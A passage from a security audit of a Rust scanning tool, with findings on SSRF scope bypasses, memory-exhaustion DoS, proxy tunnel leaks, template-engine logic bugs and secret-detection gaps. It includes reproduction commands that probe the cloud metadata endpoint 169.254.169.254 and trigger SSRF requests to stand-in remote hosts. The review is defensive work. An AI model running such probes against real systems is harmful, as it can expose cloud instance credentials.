- **Root Cause:** (1) `has_dynamic_targets` (line `1726`) checks only 4 `GuardKind` variants (`Auth`, `TxLock`, `OwnershipCheck`, `SsrfSanitizer`), so repositories with only `SMG-OAUTH-*`, `SMG-CSRF-*`, `SMG-REDIRECT-*`, or GraphQL/WS `SMG-API-*` findings never invoke sandbox verification even when `--boot-cmd` is passed. (2) In `Commands::Replay`, when both `--patch` and `--apply-check` are set with an enabled AI provider, `generate_patch_plan` is invoked once to print `ai_patch_text`, and then `run_cegis_patch_loop` (line `2553`) ignores `ai_patch_text` and calls `generate_patch_plan` again.
- **Surgical Fix:** Share `is_dynamic_probe_target` with `smg-sandbox` (covering all 5 protocol rules), and pass `ai_patch_text` as the initial candidate into `run_cegis_patch_loop` (or avoid the duplicate upfront call).

##### [F7B-06] `P1` — `deps_sync` Sends Unversioned Distro Ecosystems to OSV & Silently Caps at 2,000 Vulns
- **Location:** `src/deps_sync.rs:33-41, 80-100, 248` (`is_loopback_host:33`, `to_osv_ecosystem:80`, `sync_osv_to_store:248`)
- **Root Cause:** (1) `to_osv_ecosystem` maps `"debian"`, `"ubuntu"`, and `"alpine"` to bare `"Debian"`, `"Ubuntu"`, and `"Alpine"` without release versions (e.g., `"Debian:12"`), whereas OSV `/v1/querybatch` requires versioned ecosystem names for distro packages. (2) `unique_ids.iter().take(2000)` silently truncates without warning when more than 2,000 unique vulnerability IDs are returned. (3) `is_loopback_host` trusts literal `"localhost"` without DNS verification.
- **Surgical Fix:** Preserve/attach `os_version` when querying OSV for distro packages (`Debian:12`, `Alpine:v3.19`), emit a stderr warning if `unique_ids.len() > 2000`, and resolve `localhost` addresses to verify loopback-only.

##### [F7B-07] `P1` — `--header` Comma Delimiter Corrupts HTTP Headers & Subcommand Exit Codes Diverge (`1` vs `2`)
- **Location:** `src/lib.rs:649-735, 2970-3180` (`Commands::Sqli:655`, `Commands::Dast:697`, `Commands::HttpAudit:731`)
- **Root Cause:** (1) `--header` on `sqli`, `dast`, and `http-audit` specifies `value_delimiter = ','`, which splits any header containing commas (e.g., `Accept=text/html,application/json`, `Cookie=a=1,b=2`, `X-Forwarded-For=1.2.3.4,5.6.7.8`) into broken fragments. (2) `scan` and `replay --apply-check` exit with code `2` on security gate failures, while `image`, `tls`, `idor`, `templates`, `sqli`, `dast`, and `http-audit` exit with code `1`—colliding with `anyhow::Result`'s runtime error exit code `1` in CI pipelines.
- **Surgical Fix:** Remove `value_delimiter = ','` from `--header` (use repeatable `--header K=V --header K2=V2`) and standardize security gate failure exit code to `2` across all subcommands.

#### P2 — Moderate / Edge-Case Hardening

##### [F7B-08] `P2` — `handle_claude_pre_commit` Fails Open on Unresolved `-C` Paths & `install_git_hook` Symlink TOCTOU
- **Location:** `src/lib.rs:3820-3880, 3982-4030` (`handle_claude_pre_commit:3820`, `install_git_hook:3982`)
- **Root Cause:** (1) When `parse_git_commit_invocation` detects a `git commit` targeting a path that `resolve_hook_scan_path` cannot resolve on disk (e.g., shell variable `git -C "$REPO" commit`), `handle_claude_pre_commit` silently returns `allow` / `ExitCode::SUCCESS` instead of falling back to scanning `effective_cwd` or failing closed. (2) `install_git_hook` checks `symlink_metadata` then writes via `fs::write` (minor TOCTOU window).
- **Surgical Fix:** Fall back to scanning `effective_cwd` (or fail closed with a clear message) when a detected `git commit` has an unresolvable `-C` variable, and open the hook file with `O_NOFOLLOW` on Unix.

### 7B.3 Per-File Verdict Table (Form 7B) & Form 7 Rollup

| File | Exact `wc -l` | Verdict | Finding IDs |
| :--- | ---: | :--- | :--- |
| `src/main.rs` | 3 | `CLEAN — verified line-by-line` | — |
| `src/bin/smg.rs` | 3 | `CLEAN — verified line-by-line` | — |
| `src/rules_catalog.rs` | 103 | `CLEAN — verified line-by-line` | — |
| `src/deps_sync.rs` | 485 | `FINDINGS: 1` | F7B-06 |
| `src/oci_image.rs` | 578 | `FINDINGS: 1` | F7B-01 |
| `src/mcp.rs` | 671 | `FINDINGS: 1` | F7B-02 |
| `src/lib.rs` | 5,756 | `FINDINGS: 5` | F7B-03, F7B-04, F7B-05, F7B-07, F7B-08 |
| **Total (Form 7B)** | **7,599** | **8 Unique Findings (3 P0 · 4 P1 · 1 P2 · 0 P3)** | |
| **Form 7 Combined (13 files)** | **14,725** | **16 Unique Findings (5 P0 · 8 P1 · 3 P2 · 0 P3)** | |

---

## Form 8 — Repo-Wide Hardening Gate (`unsafe`, Panic Surface, Lints, Regex Bounds & Supply-Chain Hygiene)

- **Scope:** Entire 11-crate workspace (`Cargo.toml`, `crates/*/Cargo.toml`, `Cargo.lock` [482 packages], and all 91 production `.rs` source files)
- **Totals:** **5 unique findings** — **0 P0**, **2 P1**, **3 P2**, **0 P3**

### 8.1 Repo-Wide Verification Scorecard

| Hardening Gate Check | Measured Result | Verdict |
| :--- | :--- | :--- |
| Production `unsafe` blocks (outside tests) | **13 sites total**, 100% isolated in `crates/smg-sandbox` (`bwrap.rs`: 12, `lib.rs`: 1); 10/11 crates have **0** `unsafe` | `PARTIAL` (see F8-01) |
| Production `panic!` / `todo!` / `unreachable!` | **0** executable sites across 91 files | `PASS` |
| Non-regex production `.expect(...)` | **0** sites across 91 files | `PASS` |
| Production `.unwrap()` | **7** non-test sites across 91 files | `WARN` (see F8-03) |
| Library `std::process::exit(...)` | **1** site (`crates/smg-sandbox/src/lib.rs:321`) | `WARN` (see F8-03) |
| Production `#[allow(...)]` suppressions | **26** total (25 `clippy::too_many_arguments`, 1 `clippy::unnecessary_cast`, **0** `dead_code`/`clippy::all`) | `PASS` |
| Workspace `[workspace.lints]` / `unsafe_code = "forbid"` | **0 / 11** `Cargo.toml` manifests configure lints | `FAIL` (see F8-01) |
| Uncached / unbounded `Regex::new(...)` on untrusted input | **7** sites (`gitleaks_config.rs`, `dast_audit.rs`, `templates_audit.rs`) | `FAIL` (see F8-02) |
| Crypto / HTTP / TLS duplicate crates in `Cargo.lock` | **0** duplicate `rustls`/`ring`/`reqwest`/`hyper`/`tokio`/`rusqlite`/`regex`; **1** dual `base64` (`0.22.1` + `0.23.1`) | `WARN` (see F8-04) |
| Self-scan `smg-ignore` annotations | **3** active annotations (`proxy_tui.rs:429, 841`; `templates_audit.rs:725`) | `WARN` (see F8-05) |

### 8.2 Findings (P1–P2)

#### P1 — Workspace Hardening Gaps

##### [F8-01] `P1` — Zero `[workspace.lints]` / `#![forbid(unsafe_code)]` Enforcement Across 10 Pure-Safe Crates
- **Location:** `Cargo.toml:1-120` & all 10 non-sandbox `crates/*/Cargo.toml`
- **Root Cause:** Ten of the eleven workspace crates (`shellmind-guard`, `smg-core`, `smg-graph`, `smg-tui`, `smg-report`, `smg-ai`, `smg-hw`, `smg-web3`, `smg-pqc`, `smg-enterprise`) contain zero `unsafe` blocks, yet none of them declare `#![forbid(unsafe_code)]` or inherit `[workspace.lints.rust]` / `[workspace.lints.clippy]` (`unwrap_used`, `panic`, `todo`, `unimplemented`). Future changes can silently introduce `unsafe` or panicking unwraps without CI rejection.
- **Surgical Fix:** Add `[workspace.lints.rust]` (`unsafe_code = "forbid"`) and `[workspace.lints.clippy]` (`panic = "deny"`, `todo = "deny"`, `unimplemented = "deny"`) in root `Cargo.toml`, add `[lints] workspace = true` to every member crate, and explicitly scope `#![allow(unsafe_code)]` only to `crates/smg-sandbox`.

##### [F8-02] `P1` — Unbounded `Regex::new(...)` on Untrusted `.gitleaks.toml` / Nuclei Templates & Hot-Loop Recompilation in `dast_audit.rs`
- **Location:** `crates/smg-graph/src/gitleaks_config.rs:74, 79, 194`; `src/dast_audit.rs:47`; `src/templates_audit.rs:655, 986, 1089`
- **Root Cause:** (1) `gitleaks_config.rs` and `templates_audit.rs` compile untrusted regex strings from repository `.gitleaks.toml` or YAML templates via `Regex::new(...)` with the default 10 MiB NFA size limit and no `dfa_size_limit`, enabling memory-amplification DoS when loading hundreds of crafted regexes. (2) `src/dast_audit.rs:47` compiles a fresh `Regex::new(&format!(...))` on every call to `extract_attr` during HTML crawling instead of using a linear attribute scanner or cached regexes.
- **Surgical Fix:** Replace `Regex::new` on untrusted patterns with `RegexBuilder::new(pat).size_limit(256 * 1024).dfa_size_limit(256 * 1024).build()`, and replace `dast_audit.rs:47` with a zero-allocation linear HTML attribute parser.

#### P2 — Release Profile, Panic Hygiene & Self-Scan Discipline

##### [F8-03] `P2` — Seven Remaining Production `.unwrap()` Calls & Library `std::process::exit(130)`
- **Location:** `src/templates_audit.rs:1492`; `crates/smg-graph/src/deep_stack.rs:1036`, `taint.rs:470, 845, 858`, `phase9/mobile.rs:85`; `crates/smg-pqc/src/inventory.rs:272`; `crates/smg-sandbox/src/lib.rs:321`
- **Root Cause:** While 99%+ of the codebase avoids panics, 7 non-test `.unwrap()` calls remain in production paths (notably `src/templates_audit.rs:1492` `host.rsplit_once(':').unwrap()`), alongside `std::process::exit(130)` inside `smg-sandbox/src/lib.rs:321`.
- **Surgical Fix:** Replace all 7 `.unwrap()` calls with `.expect("invariant")` (for static regexes) or `if let Some(...)` / `let ... else` guards, and propagate Ctrl+C cancellation cleanly instead of calling `std::process::exit` from a library crate.

##### [F8-04] `P2` — `[profile.release]` Omits `overflow-checks = true` & Dual `base64` Versions in `Cargo.lock`
- **Location:** `Cargo.toml:115-120`; `Cargo.lock` (`base64` `0.22.1` + `0.23.1`)
- **Root Cause:** `[profile.release]` uses default wrapping arithmetic, allowing subtle integer overflows (e.g., TAR padding `(size + 511) & !511` in `oci_image.rs` or base-128 OID shifts in `x509.rs`) to wrap silently in release builds instead of trapping cleanly. `Cargo.lock` also links both `base64 0.22.1` and `0.23.1`.
- **Surgical Fix:** Evaluate enabling `overflow-checks = true` in `[profile.release]` (negligible overhead on I/O- and AST-bound scans) alongside checked arithmetic at all untrusted boundaries, and align `base64` versions across transitive/workspace dependencies where possible.

##### [F8-05] `P2` — Broad `smg-ignore: SMG-CFG-TLS` Suppressions on Remote-Capable HTTP Clients
- **Location:** `crates/smg-tui/src/proxy_tui.rs:841`; `src/templates_audit.rs:725`
- **Root Cause:** Both `proxy_tui.rs:841` and `templates_audit.rs:725` set `.danger_accept_invalid_certs(true)` unconditionally with `// smg-ignore: SMG-CFG-TLS`, even when `templates` runs with `--allow-remote` against non-loopback staging URLs or `proxy_tui` replays an external HTTPS URL.
- **Surgical Fix:** Restrict `.danger_accept_invalid_certs(true)` strictly to loopback/private lab targets unless an explicit `--insecure-tls` flag is passed by the user.

---

## Form 9 — Live HTTP, TLS, Proxy, DAST, SQLi, IDOR & Nuclei Template Auditors (`src/*_audit.rs`, `src/proxy.rs`, `src/live_verify.rs`)

- **Scope:** 8 Rust source files in `src/` (7,314 LOC, 100% read line 1 to EOF):
  - `src/idor_audit.rs` (319 LOC)
  - `src/proxy.rs` (678 LOC)
  - `src/tls_audit.rs` (573 LOC)
  - `src/dast_audit.rs` (1,203 LOC)
  - `src/http_audit.rs` (656 LOC)
  - `src/sqli_audit.rs` (756 LOC)
  - `src/live_verify.rs` (892 LOC)
  - `src/templates_audit.rs` (2,237 LOC)
- **Totals:** **14 findings** — **4 P0**, **7 P1**, **3 P2**, **0 P3** (0 files `CLEAN`, 8 files with findings; cross-references `F8-02`, `F8-03`, `F8-05` for regex DoS, `.unwrap()`, and TLS verification suppression)

### 9.1 Executive Summary

All 8 live network, proxy, and dynamic testing modules (7,314 LOC) were audited line-by-line across all 6 mandatory lenses.

- **Highest-Impact Risks:**
  1. **P0 Cloud IMDS (`169.254.169.254`) Permitted by Default Across 5 Subcommands (`idor_audit.rs:70-86`):** `is_lab_or_loopback_url()` explicitly permits `v4.is_link_local()` (`169.254.0.0/16`) and unresolved `*.local` hostnames, allowing default lab-scoped runs of `idor`, `http-audit`, `sqli`, `dast`, and `templates` to probe cloud instance metadata endpoints without `--allow-remote`.
  2. **P0 Multi-Vector SSRF / Remote-Target Bypass in `templates_audit.rs` & `http_audit.rs`:** `run_template_audit()` validates only `cfg.target`, while absolute template `path`/`raw` URLs (`build_url`), `Policy::limited(10)` redirects, `network.host` raw IPs, and `--graphql` endpoints in `http_audit.rs` bypass `is_lab_or_loopback_url()` completely.
  3. **P0 Unbounded Response Buffering (`resp.bytes()?` / `resp.text()`) OOM DoS Across All 6 HTTP Auditors:** `dast_audit.rs:193` and `templates_audit.rs:829` buffer the entire HTTP response into RAM *before* slicing to 2 MiB; `idor_audit`, `http_audit`, `sqli_audit`, and `live_verify` call unbounded `resp.text()`.
  4. **P0 Unbounded Thread-Per-Connection & Half-Closed `CONNECT` Tunnel Deadlock (`proxy.rs:103-190, 413-439`):** `start_proxy()` spawns unbounded OS threads and `tunnel()` disables timeouts (`set_read_timeout(None)`) without `shutdown(Shutdown::Both)`, leaking 2 OS threads and 2 sockets forever on every half-closed tunnel.
  5. **P1 Nuclei Engine Soundness & Silent Truncation (`templates_audit.rs`):** DSL matcher returns `Some(all || any)` (turning `condition: and` into `OR`), binary matchers run on UTF-8-corrupted `String::from_utf8_lossy` text, multi-path/multi-raw/multi-network blocks drop entries 2..N, template `variables`/`constants` are ignored, CRLF raw requests corrupt body offsets, `headers["..."]` lookups fail due to broken quote stripping, and DNS queries corrupt >63-byte labels and abort on the first resolver timeout.

### 9.2 Findings (P0–P2)

#### P0 — Security / Crash / OOM / Resource Exhaustion

##### [F9-01] `P0` — Default Lab/Loopback Guardrail Allows Cloud IMDS (`169.254.169.254`) & Unresolved `*.local` Across 5 Subcommands
- **Location:** `src/idor_audit.rs:70-86` (`is_lab_or_loopback_url`) — called by `idor_audit.rs`, `http_audit.rs`, `sqli_audit.rs`, `dast_audit.rs`, and `templates_audit.rs`
- **Root Cause:** `IpAddr::V4(v4) => v4.is_loopback() || v4.is_private() || v4.is_link_local()` treats IPv4 link-local `169.254.0.0/16` as a safe lab target, explicitly allowing AWS/GCP/Azure/OpenStack metadata endpoints (`169.254.169.254`) without `--allow-remote`. It also permits any `*.local` or `"localhost"` string without verifying resolved IPs (DNS rebinding / `/etc/hosts` mismatch).
- **Minimal Repro / Trigger Trace:** Run `smg dast http://169.254.169.254/latest/meta-data/` or `smg templates --target http://169.254.169.254` without `--allow-remote` -> `is_lab_or_loopback_url` returns `Ok(true)`.
- **Surgical Fix:** Remove `v4.is_link_local()` (explicitly deny `169.254.0.0/16` and IPv6 link-local `fe80::/10` / multicast / unspecified), resolve hostnames to `SocketAddr` and verify every resolved IP before connecting.

##### [F9-02] `P0` — SSRF / Remote-Target Bypass via Template URLs, Redirects, Network Hosts & `--graphql`
- **Location:** `src/templates_audit.rs:709-716, 736-747, 842-905, 1472-1510, 1755-1761`; `src/http_audit.rs:354-365, 402-406`
- **Root Cause:** (1) `run_template_audit` validates only `cfg.target`, yet `build_url` returns absolute `http://`/`https://` URLs from untrusted YAML templates verbatim, `HttpRunners::build` uses `Policy::limited(10)` without checking redirect targets against `is_lab_or_loopback_url`, and `execute_network_block` connects directly to template-defined `host` IPs without re-validating scope. (2) `http_audit.rs:402-406` probes `cfg.graphql_endpoint` without passing it through `is_lab_or_loopback_url`.
- **Minimal Repro / Trigger Trace:** Load a community YAML template containing `path: ["https://external.example/probe"]` or `network: [{host: ["8.8.8.8:80"]}]` against `--target http://127.0.0.1:8080`, or run `smg http-audit http://127.0.0.1:8080 --graphql https://remote.example/graphql` -> remote requests fire without `--allow-remote`.
- **Surgical Fix:** Enforce `is_lab_or_loopback_url` (or resolved-IP policy) on every final URL in `send_request`, inside a custom `reqwest::redirect::Policy::custom(...)`, on every `ip` in `execute_network_block`, and on `cfg.graphql_endpoint` in `run_http_audit`.

##### [F9-03] `P0` — Unbounded Response Buffering (`resp.bytes()?` / `resp.text()`) OOM DoS Across All 6 Live HTTP Auditors
- **Location:** `src/dast_audit.rs:193-195`; `src/templates_audit.rs:829-833`; `src/idor_audit.rs:223`; `src/http_audit.rs:332, 389`; `src/sqli_audit.rs:263`; `src/live_verify.rs:378, 509`
- **Root Cause:** `dast_audit.rs:193` and `templates_audit.rs:829` call `resp.bytes()?` (reading the full HTTP response body into memory unboundedly) *before* truncating to `MAX_BODY_CAPTURE` / `MAX_CAPTURE_BODY` (2 MiB). `idor_audit`, `http_audit`, `sqli_audit`, and `live_verify` call unbounded `resp.text()`.
- **Minimal Repro / Trigger Trace:** Point any of the 6 subcommands at an endpoint streaming a 2 GiB response body (e.g., `/dev/zero` or large backup download) -> `reqwest` allocates the entire body in RAM and triggers OOM.
- **Surgical Fix:** Introduce a shared helper `read_response_bounded(resp: Response, max_bytes: usize) -> Result<Vec<u8>>` using `resp.take(max_bytes as u64).read_to_end(&mut buf)` across all 6 modules.

##### [F9-04] `P0` — Unbounded Thread-Per-Connection & Half-Closed `CONNECT` Tunnel Deadlock in `src/proxy.rs`
- **Location:** `src/proxy.rs:103-190, 413-439` (`start_proxy`, `tunnel`)
- **Root Cause:** `start_proxy` spawns an unbounded OS thread (`thread::spawn`) for every accepted TCP socket with no concurrency semaphore. Inside `tunnel()`, both client and origin sockets have their read/write timeouts cleared (`set_read_timeout(None)` at lines 420–422), and `std::io::copy` runs in two directions without calling `shutdown(Shutdown::Both)` when either side hits EOF or errors. A half-closed peer leaves `up.join()` (line 438) blocked indefinitely, leaking 2 OS threads and 2 FDs per tunnel.
- **Surgical Fix:** Enforce an active-connection cap (e.g., `Arc<AtomicUsize>` bounded to 256 concurrent handlers), set an idle timeout on tunnel sockets, and call `shutdown(Shutdown::Both)` on both sockets as soon as either copy direction finishes.

#### P1 — Analytical Soundness, Protocol Corruption & High FP/FN

##### [F9-05] `P1` — DSL Matcher `all || any` Logic Inversion & UTF-8-Corrupted Binary Matcher (`src/templates_audit.rs`)
- **Location:** `src/templates_audit.rs:1000-1029` (`matcher_on_text`)
- **Root Cause:** The `"dsl"` arm computes `all` and `any` and returns `Some(all || any)`, which ignores `m.condition` (`"and"` vs `"or"`), evaluates every multi-expression `condition: and` matcher as `OR`, and returns `Some(true)` for an empty expression list. The `"binary"` arm likewise ignores `m.condition` and runs `contains_subslice` on `text.as_bytes()` *after* `String::from_utf8_lossy` already replaced non-UTF-8 bytes with `U+FFFD` (`EF BF BD`).
- **Surgical Fix:** Honor `m.condition` (`"and"` vs `"or"`, returning `false` on empty lists) in both `"dsl"` and `"binary"` arms, and retain raw `body_bytes: Vec<u8>` on `HttpResponse` for `"binary"` matchers.

##### [F9-06] `P1` — Silent Truncation of Multi-Path / Multi-Raw / Multi-Network Templates & Ignored `variables`/`constants`
- **Location:** `src/templates_audit.rs:843, 852, 894, 1327, 1477, 1869-1895` (`execute_http_block`, `execute_dns_block`, `execute_network_block`, `run_template_audit`)
- **Root Cause:** `execute_http_block` calls `.to_vec().into_iter().next()` on `raw` and `path`, silently skipping every 2nd..Nth request in a block. `run_template_audit` executes only `&tpl.network[0]`, silently ignoring `tpl.network[1..]`. All three engines pass `let extra = HashMap::new();` to `substitute()`, ignoring `tpl.variables` and `tpl.constants` deserialized from YAML.
- **Surgical Fix:** Iterate over all entries in `block.raw`, `block.path`, and `tpl.network` (respecting `stop_at_first_match`), and merge `tpl.constants` + `tpl.variables` into `extra` before variable substitution.

##### [F9-07] `P1` — CRLF Raw-Request Body Offset Drift & Broken `headers["..."]` DSL Lookup
- **Location:** `src/templates_audit.rs:548-563, 756-786` (`eval_arg`, `parse_raw_request`)
- **Root Cause:** (1) `parse_raw_request` iterates `raw.lines()` (which strips both `\n` and `\r\n`) but advances `offset` by `line.len() + 1`, undercounting by 1 byte per CRLF line and slicing the HTTP body into the middle of the header section. (2) `eval_arg` strips `"headers["` (leaving `"Server"]`), then runs `trim_start_matches("[\"")` which fails because `[` is already gone, leaving leading quotes in `name` so every `headers["..."]` lookup fails.
- **Surgical Fix:** Split raw requests cleanly on `"\r\n\r\n"` or `"\n\n"` to separate header and body slices; strip trailing `']'` and surrounding `'`/`"` quotes cleanly in `eval_arg`.

##### [F9-08] `P1` — DNS Wire-Format Label Corruption (>63 Bytes) & Single-Resolver Timeout Abort
- **Location:** `src/templates_audit.rs:1163-1174, 1283-1306` (`build_dns_query`, `send_dns_query`)
- **Root Cause:** `build_dns_query` writes `label.len().min(63) as u8` as the length octet but appends all `label.as_bytes()`, producing a malformed DNS packet whenever any label exceeds 63 bytes. `send_dns_query` binds IPv4-only `"0.0.0.0:0"` (failing for IPv6 nameservers) and uses `sock.recv_from(&mut buf).ok()?`, returning `None` immediately on the first timeout instead of continuing to fallback nameservers.
- **Surgical Fix:** Truncate `label.as_bytes()` to `&label.as_bytes()[..len]` (or reject >63-byte labels), bind `"[::]:0"` when querying IPv6 nameservers, and replace `.ok()?` with `let Ok((n, _)) = sock.recv_from(&mut buf) else { continue; };` plus `if n < 12 { continue; }`.

##### [F9-09] `P1` — High-FP `SMG-DAST-SSTI` Without Baseline Check & Cross-Port Crawl Drift (`src/dast_audit.rs`)
- **Location:** `src/dast_audit.rs:244-260, 595-612` (`resolve_url`, `active_findings_for_target`)
- **Root Cause:** `active_findings_for_target` emits a `CRITICAL` `SMG-DAST-SSTI` finding whenever `resp.body.contains("49")` without verifying that `"49"` was absent from the baseline response, false-positiving on any page containing timestamps, ports, IDs, or version strings like `Apache/2.4.49`. Additionally, `resolve_url` checks only `u.host_str() == base.host_str()`, allowing the crawler to follow links onto different schemes or ports on the same host.
- **Surgical Fix:** Require `!baseline.body.contains("49")` (and preferably a unique non-colliding arithmetic marker) before raising `SMG-DAST-SSTI`, and enforce `u.scheme() == base.scheme() && u.port_or_known_default() == base.port_or_known_default()` in `resolve_url`.

##### [F9-10] `P1` — Broken POST-Body Parameter Extraction & 1-Byte `body_diverges` Over-Sensitivity (`src/sqli_audit.rs`)
- **Location:** `src/sqli_audit.rs:279-290, 330-340, 362-375` (`body_diverges`, `run_sqli_audit`)
- **Root Cause:** When `cfg.params` is empty on a `POST` request with `--data "id=1&name=a"`, `run_sqli_audit` only inspects `url.query_pairs()` and bails `"No query parameters found"`; even with `--param`, `orig_value` is read only from `url.query_pairs()` (always `""` for POST body params, breaking numeric vs. string probe selection). Meanwhile, `body_diverges` returns `true` for any 1-byte length difference (`a.body.len() != b.body.len()`), triggering false positives on dynamic pages with timestamps or nonces.
- **Surgical Fix:** Parse `application/x-www-form-urlencoded` keys and `orig_value` from `cfg.body` when `POST`/`PUT` body data is provided, and apply a relative/edit-distance divergence threshold (e.g., >5% or >64 bytes delta after normalizing dynamic tokens) in `body_diverges`.

##### [F9-11] `P1` — `proxy.rs` Drops Chunked Request Bodies & Silently Sends Truncated HTTP Responses
- **Location:** `src/proxy.rs:262-380` (`intercept_http`)
- **Root Cause:** `intercept_http` reads request bodies solely by `Content-Length`, silently discarding `Transfer-Encoding: chunked` request bodies. When an upstream response exceeds `MAX_RESPONSE_CAPTURE` (8 MiB, line 367), it breaks out of the read loop and writes the truncated buffer to the client while keeping the original `Content-Length` header, corrupting client downloads.
- **Surgical Fix:** Support chunked request framing (or stream directly) and stream upstream responses directly to the client socket while teeing only the first `MAX_RESPONSE_CAPTURE` bytes into the inspection buffer.

#### P2 — Protocol Fragility, Guardrail Consistency & Edge Cases

##### [F9-12] `P2` — `tls_audit.rs` Single-`read()` Record Truncation, First-Addr Failure & Missing CRLF Host Validation
- **Location:** `src/tls_audit.rs:222-240, 274-290, 470-505` (`probe_raw_tls`, `run_tls_audit`, `inspect_https_headers_and_certs`)
- **Root Cause:** `probe_raw_tls` performs a single `stream.read(&mut buf)` instead of reading the full 5-byte TLS record header + `rec_len`, failing on fragmented `ServerHello` packets. `inspect_https_headers_and_certs` attempts only `addrs.next()` (failing on IPv6-first dual-stack hosts when IPv6 is unreachable) and interpolates `host` into `HEAD / HTTP/1.1\r\nHost: {host}\r\n` without rejecting `\r`/`\n`.
- **Surgical Fix:** Loop `read_exact` for the 5-byte TLS record header and `rec_len` payload (capped at 16 KiB + 5), iterate through all resolved `SocketAddr`s on connect failure, and reject any `host` containing ASCII control characters (`\r`, `\n`, `\0`).

##### [F9-13] `P2` — `live_verify.rs` Uncontained Working-Tree Reads & Whitespace-Fragile Slack JSON Matching
- **Location:** `src/live_verify.rs:382, 574` (`verify_single_token`, `run_live_secret_verification`)
- **Root Cause:** `run_live_secret_verification` reads `repo_root.join(&f.file)` without canonicalizing and verifying `starts_with(canon_root)`, allowing absolute or `..` paths in finding records to read files outside the repository. Slack verification checks literal `"\"ok\":true"` (line 382), failing if the API response contains whitespace (`"ok": true`).
- **Surgical Fix:** Canonicalize `repo_root` and the joined path (enforcing `starts_with(&canon_root)`), and parse the Slack JSON response via `serde_json::Value` (`val["ok"].as_bool() == Some(true)`).

##### [F9-14] `P2` — Over-Broad `"oob"` Substring Filter Skips Valid Templates (`src/templates_audit.rs`)
- **Location:** `src/templates_audit.rs:1636` (`unsupported_reason`)
- **Root Cause:** `raw_text.contains("oob")` matches any template containing `"oob"` as a substring inside unrelated words (e.g., `"foobar"`, `"noob"`, `"booby"`), silently skipping valid detection templates.
- **Surgical Fix:** Match structured OOB/Interactsh markers (`interactsh-url`, `interactsh_protocol`, `interactsh_request`, or word-bounded `\boob\b`) instead of a raw substring check.

---

## Form 10 — Supplemental Full-Repo Gap & Deep-Sweep Audit (CI/CD, Installers, Plugins, Temp-File Security, Cross-Crate Sweeps & `secrets_config.rs`)

- **Scope:** Complete inventory verification of all **145/145 non-target/non-git files** in `/home/km-abdullah/ShellMind-Guard` (**100% coverage, 0 files skipped**):
  - Completed full line-by-line audit of the final remaining production Rust file: **`crates/smg-graph/src/secrets_config.rs` (1,913 LOC, read 100% line 1 to EOF)** with explicit owner authorization.
  - Confirmed 100% of real workspace Rust files (**92/92 prod `.rs`** + `adversarial_precision_bench.rs` 2,836 LOC + 2 fixture `.rs`) audited line 1 to EOF.
  - Audited all previously uncovered non-Rust security surfaces: `.github/workflows/ci.yml`, `.github/workflows/release.yml`, `install.sh`, `install.ps1`, `.claude-plugin/plugin.json`, `.claude-plugin/marketplace.json`, `.mcp.json`, `hooks/hooks.json`, `skills/guard-{scan,fix}/SKILL.md`, `.shellmind-guard.toml.example`, `.gitignore`, `SECURITY.md`, and all 11 `Cargo.toml` manifests.
  - Executed repo-wide static sweep for shell spawns, predictable `/tmp` writes, `set_var` UB, and `mem::forget`/`transmute`, plus per-crate `cargo clippy --all-targets -- -D warnings` verification (0 warnings on `smg-core`, `smg-report`, `smg-ai`, `smg-pqc`, `smg-hw`, `smg-enterprise`).
- **Totals:** **11 findings** (6 Repo-Gap + 5 `secrets_config.rs`) — **0 P0**, **8 P1**, **3 P2**, **0 P3**

### 10.0 `crates/smg-graph/src/secrets_config.rs` Audit Addendum (1,913 LOC — Completes Form 4A to 18/18)

##### [F4A-S01] `P1` — `O(N^2)` Full-File Line-Vector Reallocation Inside Hot Loop
- **Location:** `crates/smg-graph/src/secrets_config.rs:880, 1155-1158` (`scan_secrets_and_config`)
- **Root Cause:** `lines` is already collected into `Vec<&str>` at line 880, yet inside the per-line loop, every line containing `.sign(` or `.sign (` re-collects `let lines_vec: Vec<&str> = content.lines().collect();` across the entire file. On large JS/TS files with many `.sign(` calls, this degrades to `O(N^2)` CPU and heap allocation churn.
- **Surgical Fix:** Reuse `&lines[idx..lines.len().min(idx + 4)]` directly instead of re-collecting `content.lines()`.

##### [F4A-S02] `P1` — Fragile `#[cfg(test)]` Brace-Depth Tracker Desynchronizes on Comments, Char Literals & Raw Strings
- **Location:** `crates/smg-graph/src/secrets_config.rs:901-943, 1496-1520` (`scan_secrets_and_config`, `scan_jwt_logic_flaws`)
- **Root Cause:** The manual `#[cfg(test)]` brace counter in `scan_secrets_and_config` ignores `//` comments, `/* */` block comments, char literals (`'{'`, `'}'`), and Rust raw strings (`r#"..."#`); `scan_jwt_logic_flaws:1503-1514` does not even skip `"..."` string literals. Any unbalanced brace inside a test string/comment either leaves `in_cfg_test = true` for the rest of the file (silently skipping production code below) or exits early (causing false positives on test fixtures).
- **Surgical Fix:** Use a proper Rust lexer/comment-and-string-aware brace scanner (or Tree-sitter AST range for `#[cfg(test)]` items).

##### [F4A-S03] `P1` — SOPS Exemption Over-Suppression & Plaintext `sops_` Prefix Blindspot
- **Location:** `crates/smg-graph/src/secrets_config.rs:791-803, 946-967` (`is_sensitive_env_or_pem_with_content`, `scan_secrets_and_config`)
- **Root Cause:** (1) In `is_sensitive_env_or_pem_with_content:796`, `t.starts_with("sops_")` treats any `.env` line starting with `sops_` as encrypted SOPS metadata, exempting plaintext secrets named `sops_api_key=...`. (2) In `scan_secrets_and_config:965-967`, any line anywhere in any source file containing `ENC[AES256_GCM,` (e.g., in a trailing comment) skips all secret and misconfiguration checks on that line.
- **Surgical Fix:** Restrict SOPS metadata exemptions strictly to known SOPS footer keys (`sops_version=`, `sops_mac=`, `sops_lastmodified=`, `sops_unencrypted_suffix=`) and require `is_sops_file` plus YAML/env key-value structure before skipping a line.

##### [F4A-S04] `P1` — `is_ignored_by_gitignore` Misses Directory-Prefix Ignores (`certs/`, `secrets/`) Causing `SMG-SEC-ENV` False Positives
- **Location:** `crates/smg-graph/src/secrets_config.rs:1635-1678` (`is_ignored_by_gitignore`)
- **Root Cause:** When `.gitignore` lists a directory rule such as `certs/` or `secrets/`, `clean_pat` strips the trailing `/` to `"certs"` and runs `glob_match("certs", file_name) || glob_match("certs", "certs/dev.pem")`, both of which return `false` because directory ancestry is never checked. Any `.env` or `.pem` inside an ignored directory triggers a false-positive `SMG-SEC-ENV` finding.
- **Surgical Fix:** Check if any ancestor path segment or directory prefix of `candidate_rel` matches `clean_pat` (or delegate to the `ignore` crate's gitignore matcher already in the workspace).

##### [F4A-S05] `P2` — Duplicate DigitalOcean Token Rule & Raw-String Secret Blindspot
- **Location:** `crates/smg-graph/src/secrets_config.rs:109-110, 317-318, 970-978` (`secret_token_pack`, `scan_secrets_and_config`)
